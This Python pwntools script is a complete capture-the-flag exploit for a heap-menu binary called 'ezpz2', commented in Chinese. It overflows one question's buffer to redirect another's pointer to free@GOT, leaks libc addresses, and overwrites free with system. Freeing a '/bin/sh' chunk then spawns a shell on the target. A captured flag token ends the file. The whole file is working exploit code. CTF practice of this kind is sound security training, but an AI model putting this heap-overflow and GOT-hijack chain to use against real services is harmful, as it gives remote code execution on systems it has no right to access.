#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("./ezpz2_patched")
libc = ELF("./libc6_2.39-0ubuntu8.6_amd64.so")
ld = ELF("./ld-linux-x86-64.so.2")
context.log_level = 'debug'
context.binary = exe
#context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','sp', '-V', '--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-h']
def conn():
    if args.L:
        p = process([exe.path])
    else:
        p = remote(os.getenv("HOST", "127.0.0.1"), int(os.getenv("PORT", "8003")))
    return p
def dbg(p,bp=None):
    if bp is not None:
        gdb.attach(p, bp)
    else:
        gdb.attach(p)
    pause()

def create_question(p):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'C')

def ask_question(p, qid):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'A')
    p.sendlineafter('Enter question id: ', str(qid))
    p.recvuntil("I have the answer perhaps: '")
def set_question(p, qid, content):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'S')
    p.sendlineafter('Enter question id: ', str(qid))
    p.sendlineafter('Enter your question: ', content)
def delete_question(p, qid):
    p.sendlineafter('Enter your choice, (or press enter to refresh): ', 'd')
    p.sendlineafter('Enter question id: ', str(qid))


p = conn()
create_question(p)  # 创建问题0
create_question(p)  # 创建问题1
create_question(p)  # 创建问题2
delete_question(p, 2)  # 删除问题
free_got = exe.got['free']
payload = b'A' * 32  # 填充Q0内容缓冲区
payload += p64(0)+p64(0x31)  # 保持下一个堆块头部大小（0x21）
payload += b'B' * 24  # 覆盖Q1结构体的前24字节
payload += p64(free_got)  # 覆盖Q1的内容指针为free@got
# dbg(p)
set_question(p, 0, payload)  # 设置问题0的内容
ask_question(p, 1)  # 触发对问题1的访问，泄露free地址
leak = p.recvuntil("'", drop=True)
free_addr = u64(leak.ljust(8, b'\x00'))
log.info("free address: " + hex(free_addr))

# 计算libc基址和system地址
libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']
putchar_addr = libc_base + libc.symbols['putchar']
log.info("libc base address: " + hex(libc_base))
log.info("system address: " + hex(system_addr))


# libc_base = free_addr - 0x09bd30
# system_addr = libc_base + 0x04c1c0
# putchar_addr = libc_base + 0x1fe27#0x0078140
# log.info("libc base address: " + hex(libc_base))
# log.info("system address: " + hex(system_addr))

# dbg(p,"b *0x4015F0  ")  # 在泄露地址后设置断点以调试
# 构造第二个payload覆盖free@got为system地址
create_question(p)  # 创建问题2，复用问题1的内存

set_question(p, 1, p64(system_addr)+p64(putchar_addr))  # 利用缓冲区溢出覆盖返回地址
set_question(p, 2, b'/bin/sh\x00')  # 填充问题2内容
# dbg(p)  # 在设置问题后设置断点以调试
delete_question(p, 2)  # 触发对问题2的删除，调用system("/bin/sh")
p.interactive()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiOC1lenB6MiIsImlwIjoiMjIzLjEwNC40MS4xOTgiLCJzZXNzaW9uIjoiNTkwNTFhZTAtMGQwYi00NjNhLTkwM2UtNzViMjk0Y2UzZDA2In0.a8EhZ4aFg9eyfpmnCSYqwICDXPT-B3z5mYmiLasDebE}
